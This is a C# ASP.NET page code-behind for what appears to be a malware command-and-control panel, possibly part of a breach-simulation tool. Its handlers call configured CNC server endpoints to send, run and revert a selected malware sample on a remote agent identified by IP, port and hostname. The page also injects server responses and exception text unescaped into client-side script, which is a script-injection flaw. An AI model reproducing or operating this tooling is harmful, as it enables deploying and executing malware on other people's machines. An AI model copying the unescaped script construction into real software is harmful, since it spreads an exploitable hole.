using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Flurl.Http;
public partial class cpanel_PC_Agents_cmd : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Page.IsPostBack == false)
        {
            DataRow dt = new Agents().SELECT(int.Parse(Request.QueryString["id"].ToString()));
            txtid.Value = dt["id"].ToString();
            txt_port.Value = dt["port"].ToString();
            txt_ip_address.Value = dt["ip"].ToString();
            txthostname.Value = dt["host_name"].ToString();


        }
    }

    protected void btn_check_status_Click(object sender, EventArgs e)
    {
        try
        {


            var responseString = string.Format(System.Configuration.ConfigurationManager.AppSettings["CNC_SEND_MALWARE"].ToString() +
                "?malware_id={0}&agent_id={1}",
                int.Parse(txt_malware_id.Value.ToString()),
                int.Parse(Request.QueryString["id"].ToString()))
                .GetStringAsync();

            string v = responseString.Result;
            GR0021XX.DataBind();
        }
        catch (Exception xxx)
        {
            string script = "Swal.fire({ type: 'error', title: 'Oops...', text: '" + "CNC Server is not reachable" + "' });";
            Page.ClientScript.RegisterStartupScript(this.GetType(), "CallMyFunction", script, true);
        }

    }

    protected void GR0021XX_RowCommand(object sender, GridViewCommandEventArgs e)
    {
        int malware_id = int.Parse(e.CommandArgument.ToString());
        if (e.CommandName == "run_malware")
        {
            try
            {

                var responseString = string.Format(System.Configuration.ConfigurationManager.AppSettings["CNC_RUN_MALWARE"].ToString() +
                    "?malware_id={0}&agent_id={1}",
                   malware_id,
                    int.Parse(Request.QueryString["id"].ToString()))
                    .GetStringAsync();

                string v = responseString.Result;
                string script = "Swal.fire({ type: 'success', title: 'Response', text: '" + v + "' });";
                Page.ClientScript.RegisterStartupScript(this.GetType(), "CallMyFunction", script, true);
            }
            catch (Exception xxx)
            {
                string script = "Swal.fire({ type: 'error', title: 'Oops...', text: '" + xxx.Message.ToString() + "' });";
                Page.ClientScript.RegisterStartupScript(this.GetType(), "CallMyFunction", script, true);
            }
        }

        else if (e.CommandName == "revert_malware")
        {
            try
            {

                var responseString = string.Format(System.Configuration.ConfigurationManager.AppSettings["CNC_REVERT_MALWARE"].ToString() +
                    "?malware_id={0}&agent_id={1}",
                   malware_id,
                    int.Parse(Request.QueryString["id"].ToString()))
                    .GetStringAsync();

                string v = responseString.Result;
                string script = "Swal.fire({ type: 'success', title: 'Response', text: '" + v + "' });";
                Page.ClientScript.RegisterStartupScript(this.GetType(), "CallMyFunction", script, true);
            }
            catch (Exception xxx)
            {
                string script = "Swal.fire({ type: 'error', title: 'Oops...', text: '" + xxx.Message.ToString() + "' });";
                Page.ClientScript.RegisterStartupScript(this.GetType(), "CallMyFunction", script, true);
            }
        }
    }
}